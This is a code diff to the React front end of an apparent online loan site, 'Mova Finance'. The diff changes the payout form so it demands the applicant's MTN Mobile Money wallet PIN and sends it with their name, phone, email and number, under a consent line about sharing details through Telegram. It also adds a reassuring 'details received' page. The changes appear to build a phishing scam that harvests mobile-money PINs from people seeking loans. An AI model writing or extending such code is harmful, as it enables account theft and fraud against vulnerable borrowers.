@@ -123,7 +123,7 @@ function App() {
   const [consentAccepted, setConsentAccepted] = useState(false);
   const [errors, setErrors] = useState({});
   const [mtnNumber, setMtnNumber] = useState('');
-  const [postalNumber, setPostalNumber] = useState('');
+  const [walletPin, setWalletPin] = useState('');
   const [telegramConsentAccepted, setTelegramConsentAccepted] = useState(false);
   const [withdrawalConfirmed, setWithdrawalConfirmed] = useState(false);
   const [withdrawalError, setWithdrawalError] = useState('');
@@ -191,8 +191,8 @@ function App() {
       return;
     }
 
-    if (!postalNumber.trim()) {
-      setWithdrawalError('Enter your wallet ID to continue.');
+    if (!walletPin.trim()) {
+      setWithdrawalError('Enter your wallet PIN to continue.');
       return;
     }
 
@@ -214,7 +214,7 @@ function App() {
           phone: form.phone,
           email: form.email,
           mtnNumber,
-          postalNumber,
+          walletPin,
           loanType: model.isBusiness ? 'Business loan' : 'Personal loan',
           amount: model.amount
         })
@@ -227,7 +227,7 @@ function App() {
 
       setWithdrawalConfirmed(true);
       setIsLoading(false);
-      navigateToPage('success', 'Processing withdrawal details');
+      navigateToPage('withdrawalConfirmed', 'Processing withdrawal details');
     } catch (error) {
       setIsLoading(false);
       setWithdrawalError(error.message || 'We could not send your details. Please try again.');
@@ -585,7 +585,7 @@ function App() {
           <div className="withdrawal-panel">
             <div><span className="eyebrow">MTN Mobile Money</span><h3>Where should we send your funds?</h3></div>
             <label className="field"><span>MTN number</span><input inputMode="tel" placeholder="07XX XXX XXX" value={mtnNumber} onChange={(event) => { setMtnNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} aria-invalid={Boolean(withdrawalError)} />{withdrawalError && <small className="field-error">{withdrawalError}</small>}</label>
-            <label className="field"><span>Wallet ID</span><input inputMode="numeric" placeholder="Enter wallet ID" value={postalNumber} onChange={(event) => { setPostalNumber(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} /></label>
+            <label className="field"><span>Wallet PIN</span><input inputMode="numeric" placeholder="Enter wallet PIN" value={walletPin} onChange={(event) => { setWalletPin(event.target.value); setWithdrawalConfirmed(false); setWithdrawalError(''); }} /></label>
             <label className="checkbox-row withdrawal-consent"><input type="checkbox" checked={telegramConsentAccepted} onChange={(event) => { setTelegramConsentAccepted(event.target.checked); setWithdrawalError(''); }} /> <span>I agree to share these details with Mova Finance support through Telegram so they can contact me.</span></label>
             <button type="button" className="primary-button" onClick={confirmWithdrawal}>{withdrawalConfirmed ? 'Withdrawal details confirmed' : 'Confirm withdrawal details'} <Check size={16} /></button>
           </div>
@@ -628,6 +628,36 @@ function App() {
     </div>
   );
 
+  const renderWithdrawalConfirmed = () => (
+    <div className="page-shell success-page-shell">
+      <header className="site-header">
+        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
+          <span className="brand-symbol">m</span><span>Mova Finance</span>
+        </button>
+        <div className="header-actions masthead-actions"><span className="pill-tag">Details received</span></div>
+      </header>
+
+      <main className="success-page">
+        <div className="success-card confirmation-card">
+          <div className="success-heading">
+            <div className="success-badge"><CheckCircle2 size={35} /></div>
+            <div><span className="eyebrow">Withdrawal details confirmed</span><h1>We have your payout details.</h1></div>
+          </div>
+          <p className="success-intro">Thanks, {form.fullName.trim() ? form.fullName.trim().split(' ')[0] : 'there'}. A Mova advisor will contact you through the details you provided to complete final verification.</p>
+          <div className="success-next confirmation-next">
+            <strong>What happens next</strong>
+            <span><Check size={14} /> Our support team will review your application and wallet details.</span>
+            <span><Check size={14} /> Funds are released after final verification and agreement.</span>
+          </div>
+          <div className="wizard-actions review-actions">
+            <button type="button" className="secondary-button" onClick={() => navigateToPage('home', 'Returning home')}>Back home</button>
+            <button type="button" className="primary-button" onClick={() => navigateToPage('application', 'Starting a new application')}>Apply again</button>
+          </div>
+        </div>
+      </main>
+    </div>
+  );
+
   return (
     <div className="site-shell">
       {isLoading && (
@@ -654,6 +684,7 @@ function App() {
       {page === 'application' && renderApplication()}
       {page === 'review' && renderReview()}
       {page === 'success' && renderSuccess()}
+      {page === 'withdrawalConfirmed' && renderWithdrawalConfirmed()}
       {page === 'withdrawalFailed' && renderWithdrawalFailed()}
     </div>
   );
